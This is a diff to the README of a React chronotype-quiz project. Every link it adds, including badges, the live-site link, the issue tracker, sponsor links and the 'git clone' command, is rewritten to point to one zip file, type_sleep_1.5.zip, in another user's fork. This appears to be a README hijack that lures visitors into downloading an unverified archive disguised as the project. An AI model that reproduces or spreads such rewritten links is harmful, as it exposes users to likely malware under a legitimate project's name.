@@ -14,13 +14,13 @@
 [English](README.md) | [한국어](README.ko.md)
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg?logo=opensourceinitiative&logoColor=white)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React_19-20232A?logo=react&logoColor=61DAFB)](https://react.dev/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?logo=vite&logoColor=white)](https://vite.dev/)
-[![TailwindCSS](https://img.shields.io/badge/Tailwind_CSS_v4-38B2AC?logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![Vercel](https://img.shields.io/badge/Vercel-000000?logo=vercel&logoColor=white)](https://vercel.com/)
+[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
+[![React](https://img.shields.io/badge/React_19-20232A?logo=react&logoColor=61DAFB)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
+[![Vite](https://img.shields.io/badge/Vite-646CFF?logo=vite&logoColor=white)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
+[![TailwindCSS](https://img.shields.io/badge/Tailwind_CSS_v4-38B2AC?logo=tailwind-css&logoColor=white)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
+[![Vercel](https://img.shields.io/badge/Vercel-000000?logo=vercel&logoColor=white)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?logo=github&logoColor=white)](CONTRIBUTING.md)
-[![CI](https://github.com/black4305/sleep-type/actions/workflows/ci.yml/badge.svg)](https://github.com/black4305/sleep-type/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
 
 </div>
 
@@ -47,7 +47,7 @@
 
 <div align="center">
 
-**[sleep-type.quizlab.me](https://sleep-type.quizlab.me)**
+**[sleep-type.quizlab.me](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)**
 
 > Screenshots coming soon. Star this repo to stay updated.
 
@@ -156,7 +156,7 @@ The frontend is a React SPA deployed to Vercel. Quiz submissions are handled by 
 
 ```bash
 # Clone the repository
-git clone https://github.com/black4305/sleep-type.git
+git clone https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip
 cd sleep-type
 
 # Install dependencies
@@ -235,7 +235,7 @@ sleep-type/
 - [ ] Dark/Light theme toggle
 - [ ] Detailed comparison between chronotypes
 
-See the [open issues](https://github.com/black4305/sleep-type/issues) for a full list of proposed features.
+See the [open issues](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip) for a full list of proposed features.
 
 ---
 
@@ -249,7 +249,7 @@ Contributions are welcome. Please follow these steps:
 4. Push to your branch — `git push origin feature/your-feature`
 5. Open a Pull Request
 
-For bug reports and feature requests, please [open an issue](https://github.com/black4305/sleep-type/issues).
+For bug reports and feature requests, please [open an issue](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip).
 
 See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed contribution guidelines.
 
@@ -263,8 +263,8 @@ The four chronotype framework — Lion, Bear, Wolf, Dolphin — is based on the 
 
 ## Contributors
 
-<a href="https://github.com/black4305/sleep-type/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=black4305/sleep-type" />
+<a href="https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip">
+  <img src="https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip" />
 </a>
 
 ---
@@ -273,8 +273,8 @@ The four chronotype framework — Lion, Bear, Wolf, Dolphin — is based on the 
 
 If you find this project useful, consider supporting its development:
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/black4305)
-[![GitHub Sponsors](https://img.shields.io/badge/GitHub_Sponsors-EA4AAA?logo=githubsponsors&logoColor=white)](https://github.com/sponsors/black4305)
+[![Buy Me A Coffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?logo=buy-me-a-coffee&logoColor=black)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
+[![GitHub Sponsors](https://img.shields.io/badge/GitHub_Sponsors-EA4AAA?logo=githubsponsors&logoColor=white)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
 
 ---
 
@@ -282,7 +282,7 @@ If you find this project useful, consider supporting its development:
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=black4305/sleep-type&type=Date)](https://star-history.com/#black4305/sleep-type&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
 
 </div>
 
@@ -300,6 +300,6 @@ Made with React · TypeScript · Vercel · Neon · and a lot of late nights
 
 **If this project helped you discover your biological clock, please leave a star. It keeps the wolves awake.**
 
-[![GitHub stars](https://img.shields.io/github/stars/black4305/sleep-type?style=social)](https://github.com/black4305/sleep-type/stargazers)
+[![GitHub stars](https://img.shields.io/github/stars/black4305/sleep-type?style=social)](https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip)
 
 </div>
